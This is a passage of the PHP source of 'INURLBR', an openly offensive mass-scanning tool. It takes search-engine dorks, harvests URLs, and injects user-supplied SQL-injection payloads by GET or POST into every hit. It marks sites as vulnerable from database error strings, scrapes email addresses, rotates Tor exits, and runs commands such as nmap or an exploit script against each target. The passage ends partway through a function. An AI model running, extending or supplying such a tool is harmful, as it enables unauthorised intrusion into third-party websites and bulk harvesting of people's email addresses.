#!/usr/bin/php
<?php
################################################################################
#GRUPO GOOGLEINURL BRASIL - PESQUISA AVANÇADA.
#SCRIPT NAME: INURLBR
#AUTOR:    Cleiton Pinheiro
#Nick:     Googleinurl
#Blog:     http://blog.inurl.com.br
#twitter: /@googleinurl
#facebook: /InurlBrasil
#Versão:  1.0
#-------------------------------------------------------------------------------
#PHP Version         5.4.7
#php5-curl           LIB
#php5-cli            LIB   
#cURL support        enabled
#cURL Information    7.24.0
#Apache              2.4
#allow_url_fopen     On
#permission          Reading & Writing
#User                root privilege, or is in the sudoers group
#Operating system    LINUX
#Proxy random        TOR                 
################################################################################
system("command clear");
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
!isset($_SESSION) ? session_start() : NULL;

//VERIFICANDO SISTEMA OPERACIONAL
servidorOS();

//CAPTURANDO VALORES TERMINAL.
$opcoes = (PHP_SAPI === 'cli') ? getopt('a:d:o:p:s:q:t:m::h', ['dork:', 'tor-random::', 'exploit-get:', 'exploit-post:', 'comand-all:', 'comand-vul:', 'help::', 'ajuda::']) : sair("MUST BE PERFORMED IN TERMINAL");

//VERIFICANDO SE LIB php5-curl ESTÁ INSTALADA.
(!extension_loaded("curl") ? sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mINSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install\033[0m\n") : NULL );

//IMPRIMINDO AJUDA.
isset($opcoes['h']) || isset($opcoes['help']) || isset($opcoes['ajuda']) ? menu() : NULL;

//ZERANDO VALORES $_SESSION['config']
$_SESSION['config'] = array();
$_SESSION["config"]["totas_urls"] = NULL;
$_SESSION["config"]["contUrl"] = 0;
$_SESSION["config"]['cont_email'] = 0;
################################################################################################################################################################
#CAPTURA DE OPÇÕES##############################################################
if (isset($opcoes['o']) && !empty($opcoes['o'])) {
    $_SESSION['config']['abrir-arquivo'] = $opcoes['o'];
} else {
    $_SESSION['config']['dork'] = isset($opcoes['dork']) && !empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE DORK ex: --dork '.asp?CategoryID='\033[0m\n\r");
}
$_SESSION['config']['extrai-email'] = isset($opcoes['m']) && empty($opcoes['o']) ? $opcoes['m'] : NULL;
$_SESSION["config"]["motor"] = isset($opcoes['q']) && !empty($opcoes['q']) && validarOpcoes('1,2,3,4,5,6,7,8,9,10,11,12,13,all', $opcoes['q']) ? $opcoes['q'] : 1;
$_SESSION['config']['arquivo_output'] = isset($opcoes['s']) && !empty($opcoes['s']) ? $opcoes['s'] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE FILE SAVE OUTPUT ex: -s filevull.txt\033[0m\n\r");
$_SESSION['config']['tipoerro'] = isset($opcoes['t']) && !empty($opcoes['t']) && validarOpcoes('1,2,3', $opcoes['t']) ? $opcoes['t'] : 1;
$_SESSION["config"]["proxy"] = isset($opcoes['p']) && !empty($opcoes['p']) ? $opcoes['p'] : NULL;
$_SESSION['config']['exploit-get'] = isset($opcoes['exploit-get']) && !empty($opcoes['exploit-get']) ? $opcoes['exploit-get'] : NULL; //?--´'0x27"
$_SESSION['config']['exploit-post'] = isset($opcoes['exploit-post']) && !empty($opcoes['exploit-post']) ? convertUrlQuery($opcoes['exploit-post']) : NULL;
$_SESSION['config']['comand-vul'] = isset($opcoes['comand-vul']) && !empty($opcoes['comand-vul']) ? $opcoes['comand-vul'] : NULL;
$_SESSION['config']['comand-all'] = isset($opcoes['comand-all']) && !empty($opcoes['comand-all']) ? $opcoes['comand-all'] : NULL;
$_SESSION['config']['achar'] = isset($opcoes['a']) && !empty($opcoes['a']) ? $opcoes['a'] : NULL;
$_SESSION['config']['debug'] = isset($opcoes['d']) && !empty($opcoes['d']) && validarOpcoes('1,2,3,4,5,6', $opcoes['d']) ? $opcoes['d'] : NULL;
$_SESSION['config']['tor-random'] = isset($opcoes['tor-random']) && !is_null($_SESSION["config"]["proxy"]) ? TRUE : NULL;
$_SESSION['config']['verifica_info'] = (validarOpcoes($opcoes['d'], 6)) ? 1 : NULL;


################################################################################################################################################################
#MENU###########################################################################

function menu() {
    return system("command clear") . sair(extra() . "  
  _    _ ______ _      _____  
 | |  | |  ____| |    |  __ \ 
 | |__| | |__  | |    | |__) |
 |  __  |  __| | |    |  ___/ 
 | |  | | |____| |____| |     
 |_|  |_|______|______|_|                       
----------------------------------------------------------------------------------------------------------------------------------

 -h      Ajuda
--help   Ajuda
--ajuda  Ajuda
 -q  Define motor de busca 1,2,3,4,5,6,7,8,9,10,11,12,13,all cada número é referente um motor.
     [opções]:
     1   - www.google.com.br
     2   - www.bing.com
     3   - br.search.yahoo.com
     4   - www.ask.com
     5   - search.hao123.com.br
     6   - ajax.googleapis.com
     7   - search.lycos.com
     8   - busca.uol.com.br
     9   - us.yhs4.search.yahoo.com
     10  - pesquisa.sapo.pt
     11  - www.dmoz.org
     12  - www.gigablast.com
     all - todos motores de busca
     Default:    1
     Exemplo: -q {op}
     Uso:     -q 1
              -q 5
               Múltiplos motores  -q 1,2,5,6,11
               Todos motores      -q all
     
 -p  Define proxy para camuflagem envio de request para o motor de busca e para alvo-exploit.
     Exemplo: -p {proxy:porta}
     Uso:     -p localhost:8118
              -p socks5://googleinurl@localhost:9050
              -p http://admin:12334@172.16.0.90:8080
   
--tor-random habilita a função tor randômico, a cada execução do script o tor muda de ip.

 -t  Define que tipo de validação o script vai efetuar op 1,2,3
     [opções]:
     1   - Tipo 1 valida erros padrões do script
     injeta & concatena exploit apartir do host & gets.
     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
   
     2   -  Tipo 2 valida o erro definido na opção -a='ALGO_DENTRO_ALVO'
     injeta & concatena exploit apartir do host & gets.
     demonstrativo: www.alvo.com.br/pasta/index.php?id={exploit}
    
     3   - Tipo 3 valida erro definido na opção -a='ALGO_DENTRO_ALVO' & erros padrão script.
     injeta & concatena exploit apartir do host.
     demonstrativo: www.alvo.com.br{exploit}
     Default:    1
     Exemplo: -t {op}
     Uso:     -t 1
     
     ERRO PADRÃO SCRIPT:  
     ERRO MYSQL,ERRO MICROSOFT,ERRO ORACLE,ERRO POSTGRESQL,
     ZEND FRAMEWORK,ERRO PHP,ERRO ASP,ERRO LUA,ERRO INDEFINIDOS
   
 --dork Define a dork que vai ser buscada nos motores.
     Exemplo: --dork {dork}
     Uso:     --dork 'site:.gov.br inurl:php? id'
     - Usando múltiplas dorks.
     Exemplo: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
     Uso:     --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'

 --exploit-get  Define exploit via get será injetado a cada URL encontrada.
     Exemplo: --exploit-get {exploit_get}
     Uso:     --exploit-get '?´0x27;'
     
 --exploit-post Define exploit via post será injetado a cada URL encontrada. 
     Exemplo: --exploit-post {exploit_post}
     Uso:     --exploit-post 'campo1=valor1&campo2=valor2&campo3=?´0x273exploit;&botao=ok'
     
 -a  Define procurar string que será procurada dentro de cada URL encontrada. 
     Exemplo: -a {string_procurada}
     Uso:     -a '<title>ola mundo</title>'
     
 -d  Define o nível de debug na execução do script op 1,2,3,4,5,6
     Exemplo: -d {op}
     Uso:     -d 1 /URL motor de busca.
              -d 2 /Mostra toda url executada. 
              -d 3 /Request detalhada de cada URL encontrada.
              -d 4 /Mostra html de cada url executada.
              -d 5 /Request detalhada de todas urls.
              
 -s  Define arquivo de saida onde vai ser salvadas as URLS vulneráveis.
     Exemplo: -s {arquivo}
     Uso:     -s seu_arquivo.txt
     
 -o  Define arquivo que vai possibilitar execucação de testes com base em arquivo,
     Sem motor de busca.
     Exemplo: -o {arquivo_minhas_urls}
     Uso:     -o testes.txt
 
-m  Habilita buscar lista de emais dentro das urls encontrdas.  

 --comand-vul Executa comandos no terminal para cada URL encontrada vulnerável.
     Exemplo: --comand-vul {comando}
     Uso:     --comand-vul 'nmap sV -p 22,80,21 _TARGET_'
              --comand-vul './exploit.sh _TARGET_ output.txt'
              
 --comand-all Executa comandos no terminal para todas URLS encontradas.
     Exemplo: --comand-all {comando}
     Uso:     --comand-all 'nmap sV -p 22,80,21 _TARGET_'
              --comand-all './exploit.sh _TARGET_ output.txt'
              
    Observação: 
    _TARGET_ será substituído por pelo URL/alvo encontrado, porem formatado sem 
    os gets & pastas será executado somente o domínio.
   _TARGETFULL_ será substituído por pelo URL/alvo encontrado será mantido a URL/alvo original encontrada. 
   
");
}

################################################################################################################################################################
#BANNER PRINCIPAL###############################################################

function bannerLogo() {

    return "
\033[1;37m  _____     
 (_____)  \033[1;37m██╗███╗   ██╗██╗   ██╗██████╗ ██╗     \033[02;31m██████╗ ██████╗ \033[0m
 \033[1;37m(\033[02;31m() ()\033[1;37m)  \033[1;37m██║████╗  ██║██║   ██║██╔══██╗██║     \033[02;31m██╔══██╗██╔══██╗\033[0m
 \033[1;37m \   /   \033[1;37m██║██╔██╗ ██║██║   ██║██████╔╝██║     \033[02;31m██████╔╝██████╔╝\033[0m
 \033[1;37m  \ /    \033[1;37m██║██║╚██╗██║██║   ██║██╔══██╗██║     \033[02;31m██╔══██╗██╔══██╗\033[0m
 \033[1;37m  /=\    \033[1;37m██║██║ ╚████║╚██████╔╝██║  ██║███████╗\033[02;31m██████╔╝██║  ██║\033[0m
 \033[1;37m [___]   \033[1;37m╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝\033[02;31m╚═════╝ ╚═╝  ╚═╝-\033[1;37mV1.0\033[0m
\n\033[1;37m0xNeither war between hackers, nor peace for the system.\r
\033[1;37m0x\033[0m\033[02;31mhttp://blog.inurl.com.br\r
\033[1;37m0x\033[0m\033[02;31mhttps://fb.com/InurlBrasil\r
\033[1;37m0x\033[0m\033[02;31mhttp://twitter.com/@googleinurl\033[0m\r
\033[1;37m0x\033[0m\033[02;31mHelp: php inurlbr.php --help\033[0m\r
\033[1;37m0x----------------------------------------------------------------------------------------------------------------------------------\033[0m\r
\r";
}

################################################################################################################################################################
#VALIDA OPÇÕES DO MENU##########################################################

function validarOpcoes($opArray, $validar, $op = NULL) {
    if (empty($validar)) {
        return FALSE;
    }
    if (empty($opArray)) {
        return FALSE;
    }
    $array = explode(',', $opArray);
    if (is_null($op)) {
        $busca = explode(',', $validar);
        for ($i = 0; $i <= count($busca); $i++) {
            if (in_array($busca[$i], $array)) {
                return TRUE;
            }
        }
    } else {
        for ($i = 0; $i <= count($array); $i++) {
            if (strstr($validar, $array[$i])) {
                return TRUE;
            }
        }
    }
    return FALSE;
}

################################################################################################################################################################
#VALIDAR SISTEMA OPERACIONAL####################################################

function servidorOS() {
    $sistema = strtoupper(PHP_OS);

    if (substr($sistema, 0, 3) == "WIN") {
        //$os = 1;
        sair(bannerLogo() . "\n\rUse the linux operating system\n\r");
    } elseif ($sistema == "LINUX") {
        // $os = 2;
    } else {
        // $os = 3;
    }
}

################################################################################################################################################################
#SALVAR CADA URL VULL COMANDO ECHO >> ARQUIVO###################################

function salvarTXT($arquivo, $valor, $op = NULL) {
    echo!is_null($op) ? "\n\033[1;37m0x|\033[02;31mVALUE SAVED IN THE FILE::\033[0;32m {$arquivo}\033[0m" : NULL;
    file_put_contents($arquivo, "{$valor}\r\n", FILE_APPEND);
}

################################################################################################################################################################
#CAPTURAR IDKEY LYCOS PARA EFETUAR PESQUISA#####################################

function getIdPesquisaLycos($html) {
    $match = NULL;
    preg_match_all("(val.*)", $html, $match);
    return (str_replace(');', '', str_replace('val(', '', str_replace("'", '', $match[0][4]))));
}

################################################################################################################################################################
#RENOVAR IP REDE TOR############################################################

function renovaTOR() {
    system("[ -z 'pidof tor' ] || pidof tor | xargs sudo kill -HUP;");
    echo "\n\r\033[1;37m0x\033[02;31mIP NETWORK TOR RENEWED=> \033[0;32m " . request_info($curl = curl_init(), 'http://dynupdate.no-ip.com/ip.php', $_SESSION["config"]["proxy"])['corpo'] . "\n\r\033[0m";
    /* https://pt.wikipedia.org/wiki/Pidof
     * pidof é um utilitário Linux que encontra o ID de um programa em execução.
     * Note que o próprio nome é a junção dos termos pid, que significa identidade
     * de um processo e of que significa de. Portanto pidof quer dizer identidade 
     * de processo de...
     * O equivalente no Solaris é pgrep. pidof firefox-bin O comando acima retorna 
     * o pid do processo que está executando firefox-bin.
     * Pode-se combinar o comando 'pidof' com o comando kill dessa forma:
     * kill -9 $(pidof firefox-bin) pidof é simplesmente uma ligação simbólica 
     * para o programa killall5,que está localizado em /sbin.
     */
}

################################################################################################################################################################
#Esta função irá validar emails  ###############################################

function validaEmail($email) {
    $conta = "^[a-zA-Z0-9\._-]+@";
    $domino = "[a-zA-Z0-9\._-]+.";
    $extensao = "([a-zA-Z]{2,4})$";

    $pattern = $conta . $domino . $extensao;

    return (ereg($pattern, $email)) ? TRUE : FALSE;
}

################################################################################################################################################################
#Esta função irá filtrar emails de cada url ####################################

function extrairMail($html) {
    $matches = NULL;
    plus();
    preg_match_all('/([\w\d\.\-\_]+)@([\w\d\.\_\-]+)/mi', $html, $matches);
    $matches_ = array_unique(array_unique($matches[0]));
    foreach ($matches_ as $valor) {
        if (validaEmail($valor)) {
            echo "\033[1;37m0x\033[0m[\033[01;31m {$_SESSION["config"]['cont_email']} \033[0m]- {$valor}\r\n";
            $_SESSION["config"]["totas_emails"].="{$valor}\n";
            plus();
            salvarTXT($_SESSION["config"]["arquivo_output"], $valor);
            $_SESSION["config"]["cont_email"] ++;
        }
        plus();
    }
}

################################################################################################################################################################
#Esta função irá enviar o conteúdo do buffer de saída (se existir algum)########

function plus() {
    ob_flush();
    flush();
}

################################################################################################################################################################
#FORMATANDO POST################################################################

function convertUrlQuery($query) {
    $queryParts = explode('&', $query);
    $params = array();
    foreach ($queryParts as $param) {
        $item = explode('=', $param);
        $params[$item[0]] = urlencode($item[1]);
    }

    return $params;
}

################################################################################################################################################################
#ABRIR ARQUIVO BASE PARA VALIDAÇÕES#############################################

function abrirArquivotxt($arquivo) {
    if (isset($arquivo) && !empty($arquivo)) {
        $ponteiro = fopen($arquivo, "r");
        while (!feof($ponteiro)) {

            (!is_null(fgets($ponteiro, 4096))) ? $resultadoURL.="[URL]" . str_replace(" POST=> ", '', str_replace(" GET=> ", '', str_replace("\n", '', str_replace("\r", '', fgets($ponteiro, 4096))))) : NULL;
        }

        fclose($ponteiro);
        processo($resultadoURL);
    }
}

################################################################################################################################################################
#CAPTURA POSIÇÃO DA URL NO BUSCADOR ALEXA /RELEVÂNCIA DE TAL URL################

function posicaoAlexa($url) {

    $xmlSimple = simplexml_load_file("http://data.alexa.com/data?cli=10&dat=snbamz&url={$url}");
    $resultRank = $xmlSimple->SD[1];
    plus();
    if ($resultRank) {
        $retornoRank = $resultRank->REACH->attributes()->RANK;
    } else {
        $retornoRank = 0;
    }
    return $retornoRank;
}

################################################################################################################################################################
#GERA AGENT BROWSER RANDÔMICOS##################################################

function setUserAgent() {

    $agentBrowser = array('Firefox', 'Safari', 'Opera', 'Flock', 'Internet Explorer', 'Seamonkey', 'Tor Browser', 'GNU IceCat',
        'Konqueror', 'Mobile', 'Konqueror', 'Netscape', 'Chrome', 'Dragon', 'SeaMonkey', 'Maxthon', 'K-Meleon', 'GoogleBot'
    );

    $agentSistema = array('Windows 3.1', 'Windows 95', 'Windows 98', 'Windows 2000', 'Windows NT',
        'Windows XP', 'Windows Vista', 'Redhat Linux', 'Ubuntu', 'Fedora', 'AmigaOS', 'BackTrack Linux',
        'CentOS Linux', 'Debian Linux', 'Macintosh', 'Android', 'iPhone', 'Windows NT 6.1', 'BeOS', 'OS 10.5'
    );

    $locais = array('cs-CZ', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'ar_JO',
        'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'ar_SY', 'ar_TN', 'ar_AE', 'ar_YE', 'ar',
        'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs',
        'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA',
        'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE',
        'de_LU', 'de_CH', 'de', 'el_CY', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'in', 'ga_IE',
        'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY',
        'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME',
        'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV',
        'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE',
        'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk', 'vi_VN', 'vi'
    );
    return '0xSCANNER-INURL_blog.inurl.com.br-' . $agentBrowser[rand(0, count($agentBrowser) - 1)] . '/' . rand(1, 20) . '.' . rand(0, 20) . ' (' . $agentSistema[rand(0, count($agentSistema) - 1)] . ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locais[rand(0, count($locais) - 1)] . ';)';
}

################################################################################################################################################################
#RESPONSÁVEL POR EXECUTAR COMANDOS NO TERMINAL##################################

function comando($comando, $alvo) {
    if (!is_null($comando)) {
        (strstr($comando, '_TARGET_') || strstr($comando, '_TARGETFULL_') ? NULL : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mSET PARAMETER - comand correctly\033[0m\n"));
        if (strstr($comando, '_TARGET_')) {
            $alvo = parse_url($alvo);
            $alvo_ = (isset($alvo['host'])) ? $alvo['host'] : $alvo['path'];
            $comando = str_replace('_TARGET_', escapeshellarg($alvo_), $comando);
        } else {

            $comando = str_replace('_TARGETFULL_', escapeshellarg($alvo), $comando);
        }

        echo "\n\033[1;34m[*]__\033[0m\n";
        echo "     \033[1;34m|EXTERNAL COMMAND:: {$comando}\033[1;35m\n";
        $dados = system($comando, $dados);
        plus();
        sleep(1);
        echo "\033[0m";
    }
    if (empty($dados[0])) {
        return FALSE;
    }
    unset($dados);
}

################################################################################################################################################################
#RESPONSÁVEL POR TODOS REQUESTS GET/POST DO SCRIPT##############################

function request_info($curl, $url_, $proxy = NULL, $postDados = NULL) {
    plus();
    //FORMATANDO POST & EXECUTANDO urlencode EM CADA VALOR DO POST.
    if (isset($postDados) && !empty($postDados) && is_array($postDados)) {

        foreach ($postDados as $campo => $valor) {
            $postDados_format .= $campo . '=' . urlencode($valor) . '&';
        }
        $postDados_format = rtrim($postDados_format, '&');
        curl_setopt($curl, CURLOPT_POST, count($postDados));
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postDados_format);
    }

    curl_setopt($curl, CURLOPT_URL, $url_);
    curl_setopt($curl, CURLOPT_USERAGENT, setUserAgent());
    curl_setopt($curl, CURLOPT_REFERER, "http://blog.inurl.com.br/" . md5(intval(rand() % 255) . intval(rand() % 255) . intval(rand() % 255) . intval(rand() % 255)));

    (!is_null($proxy) ? curl_setopt($curl, CURLOPT_PROXY, $proxy) : NULL);
    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_HEADER, 1) : NULL;
    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_FRESH_CONNECT, 1) : NULL;
    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0) : NULL;
    (!is_null($_SESSION['config']['verifica_info']) && validarOpcoes('3,6', $_SESSION['config']['debug']) ? curl_setopt($curl, CURLOPT_VERBOSE, 1) : NULL);

    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $corpo = curl_exec($curl);
    $server = curl_getinfo($curl);
    $status = null;

    preg_match_all('(HTTP.*)', $corpo, $status['http']);
    preg_match_all('(Server:.*)', $corpo, $status['server']);
    preg_match_all('(X-Powered-By:.*)', $corpo, $status['X-Powered-By']);


    $info = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}  {$status['X-Powered-By'][0][0]}"));
    debug($corpo, 4);
    debug($url_, 2);
    curl_close($curl);
    unset($curl);
    plus();
    return isset($corpo) ? array('corpo' => $corpo, 'server' => $server, 'info' => $info) : FALSE;
}

################################################################################################################################################################
#CAPTURAR INFORMAÇÕS DO SERVIDOR E VALIDAR POSSÍVEIS FALHAS#####################

function infoServer($url_, $postDados = NULL) {

    plus();
    $_SESSION['config']['verifica_info'] = 1;
    $resultado = request_info($curl = curl_init(), $url_, $_SESSION["config"]["proxy"], $postDados);
    if (isset($resultado['corpo'])) {
        if (isset($_SESSION['config']['extrai-email'])) {
            plus();
            return extrairMail($resultado['corpo']);
        }
        $_SESSION['config']['erroReturn'] = verificaErro($resultado['corpo']);
        $_SESSION['config']['vull_style'] = (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? "\033[1;37m0x0x0x\033[0;32m::[0xTARGET 0xPOTENTIALLY 0xVULNERABLE]=>  \033[42;30m" : NULL;
        $_SESSION['config']['resultado_vull'].=(isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? "{$url_}\n\r" : NULL;
        $url_ = posicaoAlexa($url_);
    } else {
        return FALSE;
    }
    plus();
    return "{$resultado['info']}, IP:{$resultado['server']['primary_ip']}:{$resultado['server']['primary_port']} , RANK ALEXA:{$url_}";
}

################################################################################################################################################################
#ERROS PROCESSO PRINCIPAL RESPONSÁVEL POR TODO MOTOR DE VALIDAÇÕES##############

function processoUrlExec($url, $contUrl) {
    plus();
    $host = $_SESSION['config']['tipoerro'] == '3' ? parse_url($url) : ($url);
    $info = infoserver(gerarErroDB(isset($host['host']) ? $host['host'] : $url), $_SESSION['config']['exploit-post']);
    if (!isset($_SESSION['config']['extrai-email'])) {
        $url_ = isset($host['host']) ? $host['host'] : urldecode($url);
        $exget = (!is_null($_SESSION['config']['exploit-get']) && !empty($_SESSION['config']['exploit-get']) ? ' GET=> ' . $_SESSION['config']['exploit-get'] : NULL);
        $expost = (!is_null($_SESSION['config']['exploit-post']) && !empty($_SESSION['config']['exploit-post']) ? ' POST=> ' . $_SESSION['config']['exploit-post'] : NULL);
        $info = (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? "\033[0;32m{$info}" : $info;
        echo "\r\n";
        echo "\033[1;37m[+]----------------------------------------------------------------------------------------------------------------------------------\033[0m\n";
        echo "\033[1;37m0x| \033[0m[ \033[1;37m{$contUrl}\033[0m ] => \033[02;31m{$_SESSION['config']['vull_style']}{$url_}\033[0m\n";
        echo "\033[1;37m0x| \033[0m\033[02;31mExploit:: \033[0m\033[1;31m{$exget}{$expost}\033[0m\n";
        echo "\033[1;37m0x| \033[0m\033[02;31mExtra info:: \033[0m\033[0;31m{$info}\033[1;37m\n";
        echo "\033[1;37m0x| \033[0m\033[02;31mError found:: \033[0;31m" . (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn']) ? "\033[0;32m{$_SESSION['config']['erroReturn']}" : "0xNO INFORMATION") . "\033[0m";
        ((isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? salvarTXT($_SESSION['config']['arquivo_output'], "{$url}{$exget}{$expost}", 1) : null);
        !is_null($_SESSION['config']['erroReturn']) && !is_null($_SESSION['config']['comand-vul']) ? comando($_SESSION['config']['comand-vul'], $url_) : NULL;
        !is_null($_SESSION['config']['comand-all']) ? comando($_SESSION['config']['comand-all'], $url_) : NULL;
    }
}

################################################################################################################################################################
#IMPRIMIR MENSAGEM E SAIR DO PROCESSO###########################################

function sair($msg) {

    echo $msg;
    exit();
}

################################################################################################################################################################
#ERROS PROCESSO PRINCIPAL RESPONSÁVEL POR TODO MOTOR DE VALIDAÇÕES##############

function processo($resultadoURL) {
    plus();
    $resultadoURL = array_filter(explode("[URL]", $resultadoURL));
    $resultadoURL_ = array_unique($resultadoURL);
    echo "\n\r\033[1;37m0x\033[0;31mTOTAL FOUND URLS::\033[1;37m [ " . count($resultadoURL_) . " ]\033[0m\n\r";
    debug($resultadoURL_, 3);

    foreach ($resultadoURL_ as $url) {
        if (!is_null($url) && !empty($url)) {
            $_SESSION["url_dump"].="{$url}\n\r";
            processoUrlExec(urldecode($url), $_SESSION["config"]["contUrl"]);
            $_SESSION["config"]["contUrl"] ++;
            plus();
        }
    }
}

################################################################################################################################################################
#ERROS PADRÕES DO SCRIPT VALIDA COM HTML RECEBIDO###############################

function verificaErro($html_) {

    if (validarOpcoes($_SESSION['config']['tipoerro'], 1) || validarOpcoes($_SESSION['config']['tipoerro'], 3)) {

        #ZEND FRAMEWORK
        $erro['ZEND-FRAMEWORK-01'] = 'mail.transport.username';
        $erro['ZEND-FRAMEWORK-02'] = 'mail.transport.password';
        $erro['ZEND-FRAMEWORK-03'] = 'db.params.username';
        $erro['ZEND-FRAMEWORK-04'] = 'db.params.password';
        $erro['ZEND-FRAMEWORK-05'] = 'db.params.dbname';

        #ERROS MYSQL
        $erro['MYSQL-01'] = 'mysql_';
        $erro['MYSQL-02'] = 'You have an error in your SQL syntax;';
        $erro['MYSQL-03'] = 'Warning: mysql_';
        $erro['MYSQL-04'] = 'function.mysql';
        $erro['MYSQL-05'] = 'MySQL result index';
        $erro['MYSQL-06'] = 'syntax;';
        $erro['MYSQL-07'] = 'MySQL';
        $erro['MYSQL-08'] = 'mysqli.query';
        $erro['MYSQL-09'] = 'num_rows';

        #ERROS MICROSOFT
        $erro['MICROSOFT-01'] = 'Microsoft JET Database';
        $erro['MICROSOFT-02'] = 'ODBC Microsoft Access Driver';
        $erro['MICROSOFT-03'] = '500 - Internal server error';
        $erro['MICROSOFT-04'] = 'Microsoft OLE DB Provider';
        $erro['MICROSOFT-05'] = 'Unclosed quotes';
        $erro['MICROSOFT-06'] = 'ADODB.Command';
        $erro['MICROSOFT-07'] = 'ADODB.Field error';
        $erro['MICROSOFT-08'] = 'Microsoft VBScript';
        $erro['MICROSOFT-09'] = 'Microsoft OLE DB Provider for SQL Server';
        $erro['MICROSOFT-10'] = 'Unclosed quotation mark';

        #ERROS JDBC
        $erro['JDBC_CFM-01'] = 'Error Executing Database Query';
        $erro['JDBC_CFM-02'] = 'SQLServer JDBC Driver';

        #ERROS ORACLE
        $erro['ORACLE-01'] = 'Microsoft OLE DB Provider for Oracle';
        $erro['ORACLE-02'] = 'ORA-01756';
        $erro['ORACLE-03'] = 'ORA-';

        #ERROS POSTGRESQL
        $erro['POSTGRESQL-01'] = 'pg_';
        $erro['POSTGRESQL-02'] = 'Warning: pg_';
        $erro['POSTGRESQL-03'] = 'PostgreSql Error:';
        $erro['POSTGRESQL-04'] = 'function.pg';

        #ERROS PHP
        $erro['ERRORPHP-01'] = 'Warning: include';
        $erro['ERRORPHP-02'] = 'Fatal error: include';
        $erro['ERRORPHP-03'] = 'Warning: require';
        $erro['ERRORPHP-04'] = 'Fatal error: require';
        $erro['ERRORPHP-05'] = 'ADODB_Exception';

        #ERROS ASP
        $erro['ERRORASP-01'] = 'Version Information: Microsoft .NET Framework';
        $erro['ERRORASP-02'] = "Server.Execute Error";

        #ERROS LUA
        $erro['ERRORLUA-01'] = 'LuaPlayer ERROR:';
        $erro['ERRORLUA-02'] = 'CGILua message';
        $erro['ERRORLUA-03'] = 'Lua error';

        #ERROS INDEFINIDOS
        $erro['INDEFINITE-01'] = 'SQL';
        $erro['INDEFINITE-02'] = 'Fatal error';
        $erro['INDEFINITE-03'] = 'Warning';
        $erro['INDEFINITE-04'] = 'Invalid Querystring';
        $erro['INDEFINITE-05'] = 'Input string was not in a correct format';
        $erro['INDEFINITE-06'] = 'GetArray()';
        $erro['INDEFINITE-07'] = 'FetchRow()';

        if (validarOpcoes($_SESSION['config']['tipoerro'], 3) && isset($_SESSION['config']['achar'])) {
            $erro['ERROR-CUSTOM'] = $_SESSION['config']['achar'];
        }
    } else {

        $erro['ERROR-CUSTOM'] = $_SESSION['config']['achar'];
    }
    foreach ($erro as $campo => $valor) {

        if (validaBD($html_, $erro[$campo], $campo)) {
            return(" {$campo}  -  ERRO: {$erro[$campo]}");
        }
    }
}

################################################################################################################################################################
#VERIFICAR ERROS DENTRO DO HTML2################################################

function validaBD($html_, $verificar, $bd) {

    return (strstr($html_, $verificar)) ? $bd : NULL;
}

################################################################################################################################################################
#GERAR ERRO E FORMAR URL########################################################

function gerarErroDB($_url) {
    $_url = explode("=", urldecode($_url));
    $get = max(array_keys($_url));
    $get_ = $_url[$get];
